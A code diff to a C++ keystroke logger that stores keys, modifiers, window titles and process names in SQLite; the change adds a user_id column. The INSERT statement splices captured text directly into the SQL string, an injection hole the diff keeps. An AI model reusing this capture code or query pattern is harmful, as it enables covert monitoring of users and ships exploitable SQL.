@@ -66,7 +66,8 @@ void KeyLogger::memory(const KeyLog& keylog) {
             key TEXT,
             modifiers TEXT,
             window_title TEXT,
-            process_name TEXT
+            process_name TEXT,
+            user_id INT
         );
     )";
     if (sqlite3_exec(db, createTableSQL, nullptr, nullptr, &errMsg) != SQLITE_OK) {
@@ -92,9 +93,10 @@ void KeyLogger::memory(const KeyLog& keylog) {
     std::string modifiers = return_Modifier_from_Hotkey(keylog.current);
     std::string window_title = wstring_to_utf8(keylog.window_title);
     std::string process_name = wstring_to_utf8(keylog.processname);
+    std::string user_id = std::to_string(this->user_id);
 
-    std::string insertSQL = "INSERT INTO keylogs (session_id, sequence_id, timestamp, key, modifiers, window_title, process_name) VALUES ('" +
-        session_id + "', '" + sequence_id + "', '" + timestamp + "', '" + key + "', '" + modifiers + "', '" + window_title + "', '" + process_name + "');";
+    std::string insertSQL = "INSERT INTO keylogs (session_id, sequence_id, timestamp, key, modifiers, window_title, process_name, user_id) VALUES ('" +
+        session_id + "', '" + sequence_id + "', '" + timestamp + "', '" + key + "', '" + modifiers + "', '" + window_title + "', '" + process_name + "', '" + user_id + "');";
 
     if (sqlite3_exec(db, insertSQL.c_str(), nullptr, nullptr, &errMsg) != SQLITE_OK) {
         debug_log(LogLevel::Error, "Insertion Error ", errMsg);
@@ -108,6 +110,9 @@ void KeyLogger::memory(const KeyLog& keylog) {
 
 void KeyLogger::setLaunchCounter(int lcounter){
     launchCounter = lcounter;
+}
+void KeyLogger::setUserID(int lid){
+    user_id = lid;
 }
 void KeyLogger::setRand(){
     std::random_device rd;
